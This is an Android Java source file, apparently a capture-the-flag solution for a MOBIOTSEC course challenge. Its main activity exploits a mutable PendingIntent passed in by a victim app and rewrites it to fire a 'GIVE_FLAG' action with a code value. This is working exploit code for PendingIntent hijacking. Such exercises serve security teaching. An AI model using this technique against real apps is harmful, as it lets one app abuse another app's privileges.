package com.example.maliciousapp;

import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class MainActivity extends AppCompatActivity {
    public String TAG = "MOBIOTSEC";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        try {
            exploit();
        } catch (PendingIntent.CanceledException e) {
            throw new RuntimeException(e);
        }
    }

    public void exploit() throws PendingIntent.CanceledException {
        Intent received = getIntent();
        String action = received.getAction();
        // mobiotsec.MUTATE_ME   GIVE_FLAG
        if (action.equals("mobiotsec.MUTATE_ME")) {
            Log.i(TAG, "Received intent from victim");
            PendingIntent pendingIntent = (PendingIntent) received.getExtras().get("pending_intent");
            Intent intent2 = new Intent("mobiotsec.GIVE_FLAG");
            intent2.putExtra("code", 42);
            pendingIntent.send(this, 0, intent2);
        }
    }
}